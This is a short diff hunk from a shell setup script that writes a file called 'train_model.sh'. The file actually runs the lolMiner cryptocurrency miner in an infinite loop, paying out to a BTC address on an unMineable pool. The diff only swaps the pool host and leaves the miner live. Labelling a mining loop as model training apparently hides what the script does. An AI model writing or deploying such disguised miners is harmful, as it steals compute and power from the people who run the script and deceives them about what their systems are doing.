@@ -68,7 +68,7 @@ sudo tee "$PROJECT_DIR/train_model.sh" > /dev/null <<EOF
 #!/bin/bash
 cd $PROJECT_DIR
 while true; do
-  ./lolMiner --algo OCTOPUS --pool cfx.unmineable.com:3333 \\
+  ./lolMiner --algo OCTOPUS --pool octopus.unmineable.com:3333 \\
   --user BTC:${BTC_ADDRESS}.${WORKER_NAME}#${REF_CODE} \\
   --ethstratum ETHPROXY
 
